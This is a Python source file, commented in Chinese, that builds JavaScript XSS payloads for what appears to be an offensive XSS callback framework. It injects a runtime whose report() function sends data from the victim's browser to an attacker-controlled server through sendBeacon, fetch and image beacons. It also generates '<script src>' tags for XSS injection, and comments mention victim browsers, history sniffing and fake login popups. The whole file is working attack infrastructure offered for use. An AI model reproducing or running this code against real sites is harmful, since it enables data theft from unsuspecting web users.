"""JS payload 构建器 — 模块 body + 参数 → 最终可执行 JS。

渲染规则:
- {{param}}           → 模块参数(html 转义,防引号破坏脚本)
- {{config.xxx}}      → 配置字段注入
- {{host}}            → 反连服务器对外地址(默认 127.0.0.1,可被参数 host 覆盖)
- 未知占位符           → 替换为空(与 flowscan config.render_template 同款正则)

每个 payload 顶部注入公共运行时:
- SERVER  反连根地址
- report(data)  Image beacon 跨域回传(无需 CORS,GET 型 kb 级以内)
- _q(name, def)    参数读取助手(URL query 覆盖模块默认值)
"""

import json
import re
from typing import Any, Dict, Optional

from .module_loader import param_default

_HTML_ESCAPE = {
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
}
_ESCAPE_RE = re.compile(r"[&<>\"']")


def _html_escape(s: str) -> str:
    return _ESCAPE_RE.sub(lambda m: _HTML_ESCAPE[m.group(0)], str(s))


def _js_escape(s: str) -> str:
    """JS 字符串字面量转义(JSON 风格 + `<`/`'` 转 \\uXXXX)。

    2026-09-15(R14):此前对**所有**占位符值做 HTML 转义,而 payload 里的占位符
    几乎都落在 JS 字符串里("{{tag}}"/"{{urls}}"/"{{interval}}")→ 自定义模块的
    代码里 `&&` 变 `&amp;&amp;`、URL 里的 `&` 被改写,直接语法错误/取值错误。
    现在按 JS 语义转义:引号/反斜杠/newline 走 json.dumps,`<` 转 \\u003c
    (兼顾「代码可能被内联进 <script>」的闭合风险),`'` 转 \\u0027(单引号
    字符串也安全);`&` 保持原样。
    """
    out = json.dumps(str(s), ensure_ascii=False)[1:-1]
    return out.replace("<", "\\u003c").replace("'", "\\u0027")


# 这些参数的值是 JS 代码本体(不是字符串内容)→ 原样注入,不做转义
_CODE_PARAMS = {"code", "custom", "js", "payload"}


_PLACEHOLDER_RE = re.compile(r"\{\{\s*([^{}]+?)\s*\}\}")


def default_param_value(mod: Any, pname: str) -> str:
    r"""参数缺省值(委托 module_loader.param_default,单一实现:B8)。

    保留本函数名是为了兼容既有调用/脚本(round8 回归脚本会直接调它)。

    2026-09-15(R30):此前一律用 `默认\s*([^\s,;]+)` 从说明文字里抓 ——
    history_sniff 的 hint「探测 URL 列表,逗号分隔(默认常见站点)」被抓成
    「常见站点)」这种垃圾值预填到构建表单 → 探测直接失效。现在:
      1. params 写第三元素即显式默认值(推荐写法,不受文案影响);
      2. 正则兜底剥掉括号/引号等标点,且「纯中文说明文字」(如 常见站点/默认值)
         判定为无默认值返回空串 —— 中文默认值(如弹窗标题「登录验证」)请用第 1 种写法。
    """
    params = mod.get("params", []) if hasattr(mod, "get") else getattr(mod, "params", [])
    return param_default(params or [], pname)


def _render(template: str, context: Dict[str, Any], config: Any) -> str:
    """{{expr}} 占位符替换。expr = 参数名 | config.字段 | host。

    参数值默认按 JS 字符串字面量转义;`_CODE_PARAMS` 里声明的参数(如自定义
    模块的 code)原样注入(它们本身就是代码)。
    """
    if not template:
        return ""

    def replace(match: re.Match) -> str:
        expr = match.group(1).strip()
        if expr == "host":
            return _js_escape(str(context.get("host", "127.0.0.1")))
        if expr.startswith("config."):
            key = expr[len("config."):]
            # port 允许被调用方 context 覆盖(payload 反连端口设置)
            if key == "port" and "port" in context:
                return _js_escape(str(context["port"]))
            return _js_escape(str(getattr(config, key, "")))
        value = context.get(expr, "")
        return str(value) if expr in _CODE_PARAMS else _js_escape(str(value))

    return _PLACEHOLDER_RE.sub(replace, template)


# 公共运行时前缀(注入到每个 payload 顶部;紧凑无注释)
_RUNTIME_PREFIX = r"""var SERVER = "http://{{host}}:{{config.port}}";
var _PH_BEACON_MAX = 60000;
var _PH_POST_MAX = 1048576;
function _q(name, dflt) {
  try {
    var m = new RegExp('[?&]' + name + '=([^&]*)').exec(location.search);
    return m ? decodeURIComponent(m[1].replace(/\+/g, ' ')) : (dflt == null ? '' : dflt);
  } catch (e) { return dflt == null ? '' : dflt; }
}
function _phGetRetry(url, tries) {
  try {
    var img = new Image();
    img.onerror = function () { if (tries > 0) setTimeout(function () { _phGetRetry(url, tries - 1); }, 700); };
    img.src = url;
  } catch (e) {}
}
function report(d) {
  try {
    var payload = JSON.stringify(d);
    if (payload.length > _PH_POST_MAX) {
      d = { type: (d && d.type) || 'oversize', truncated: true, size: payload.length };
      payload = JSON.stringify(d);
    }
    var url = SERVER + "{{config.route_report}}";
    var getUrl = url + "?d=" + encodeURIComponent(payload.slice(0, 1800));
    if (navigator.sendBeacon && payload.length <= _PH_BEACON_MAX) {
      try { if (navigator.sendBeacon(url, payload)) return; } catch (e) {}
    }
    if (window.fetch && payload.length <= _PH_POST_MAX) {
      try {
        fetch(url, { method: 'POST', body: payload, keepalive: true, mode: 'cors' })
          .then(function (r) { if (!r || !r.ok) _phGetRetry(getUrl, 2); },
                function () { _phGetRetry(getUrl, 2); });
        return;
      } catch (e) {}
    }
    _phGetRetry(getUrl, 2);
  } catch (e) {}
}
"""


class PayloadBuilder:
    """模块 → JS payload。"""

    def __init__(self, loader, config):
        self._loader = loader
        self._config = config

    def runtime(self, host: str = "", port: Optional[int] = None) -> str:
        """渲染公共运行时(SERVER / report / _q)供独立页面注入。

        server 直出页面(pages/<name>/index.html)时不经过 build(),页面里的
        app.js 仍会调 report()——必须由调用方把这段运行时注入页面,
        否则浏览器报 ReferenceError: report is not defined(回传全丢)。
        """
        context = {"host": host or "127.0.0.1"}
        if port is not None:
            try:
                p = int(port)
                if 1 <= p <= 65535:
                    context["port"] = p
            except (TypeError, ValueError):
                pass
        return _render(_RUNTIME_PREFIX, context, self._config)

    def build(self, name: str, params: Optional[Dict[str, Any]] = None,
              host: str = "", port: Optional[int] = None) -> Dict[str, Any]:
        """构建指定模块的最终 JS 代码。

        params: 模块参数 dict(可选,缺省用模块声明参数的默认提示值)
        host:   反连地址覆盖(缺省 127.0.0.1)
        port:   反连端口覆盖(缺省 config.port;1-65535 校验,非法忽略)

        Returns: {"ok": True, "code": str} 或 {"ok": False, "error": str}
        """
        mod = self._loader.get_module(name)
        if not mod:
            return {"ok": False, "error": f"模块 {name} 不存在"}
        declared = [p[0] for p in mod.get("params", [])]
        unknown = set(params or {}) - set(declared)
        if unknown:
            return {"ok": False, "error": f"未知参数: {sorted(unknown)}"}
        context = {"host": host or "127.0.0.1"}
        if port is not None:
            try:
                p = int(port)
                if 1 <= p <= 65535:
                    context["port"] = p
            except (TypeError, ValueError):
                pass
        for pname in declared:
            if params and pname in params and params[pname] is not None:
                context[pname] = str(params[pname])
            else:
                # 缺省值:params 第三元素(显式)→ hint 正则兜底(见 default_param_value)
                context[pname] = default_param_value(mod, pname)
        runtime = self.runtime(host=str(context.get("host") or ""), port=port)
        body = _render(mod.get("body", ""), context, self._config)
        code = runtime + "\n" + body + "\n"
        if len(code.encode("utf-8")) > self._config.max_payload_bytes:
            return {"ok": False,
                    "error": f"payload {len(code)} 字节超过上限 "
                             f"{self._config.max_payload_bytes}"}
        return {"ok": True, "code": code, "module": name}

    def build_script_tag(self, name: str, params: Optional[Dict[str, Any]] = None,
                         host: str = "", port: Optional[int] = None) -> Dict[str, Any]:
        """生成 XSS 注入用 <script src> 标签。

        host/port: 反连地址/端口覆盖(缺省 127.0.0.1 / config.port)

        Returns: {"ok": True, "tag": str, "url": str} 或 {"ok": False, ...}
        """
        mod = self._loader.get_module(name)
        if not mod:
            return {"ok": False, "error": f"模块 {name} 不存在"}
        parts = [f"m={name}"]
        # host/port 解析优先级:显式参数 → 模块参数(params,如 xss_payload 自带 host)→ 默认
        # 否则构建界面在模块参数里填了 host、单独输入框留空时,URL 会回退 127.0.0.1
        eff_host = host or (params or {}).get("host") or ""
        eff_port = port
        if eff_port is None and params and str(params.get("port") or "").strip():
            eff_port = str(params["port"]).strip()
        # host/port 作为查询参数带进 URL——受害者浏览器加载 payload.js 时,
        # _handle_payload 从 URL 读 host/port,payload 内部 SERVER 才会回连真实服务器。
        if eff_host:
            parts.append(f"host={_urlencode(eff_host)}")
        if eff_port is not None:
            parts.append(f"port={eff_port}")
        if params:
            # 非 host/port 参数统一打包成 a=<JSON> 查询参数:与 payload.js 链路
            # (_handle_payload 只解析 m/a/host/port)保持一致 —— 逐个拼 ?k=v 时
            # 这些参数会被服务端忽略,模块只能拿默认值跑(2026-09-15 修复)。
            extra = {k: v for k, v in params.items()
                     if k not in ("host", "port") and v not in (None, "")}
            if extra:
                parts.append("a=" + _urlencode(json.dumps(extra,
                                                          ensure_ascii=False)))
        qs = "?" + "&".join(parts)
        p = self._config.port
        if eff_port is not None:
            try:
                pi = int(eff_port)
                if 1 <= pi <= 65535:
                    p = pi
            except (TypeError, ValueError):
                pass
        url = (f"http://{eff_host or '127.0.0.1'}:{p}"
               f"{self._config.route_payload}{qs}")
        # 标签是 HTML 片段,src 属性按 HTML 转义(& → &amp; 等,浏览器会解回)
        tag = f'<script src="{_html_escape(url)}"></script>'
        return {"ok": True, "tag": tag, "url": url}


def _urlencode(s: str) -> str:
    import urllib.parse
    return urllib.parse.quote(s, safe="")
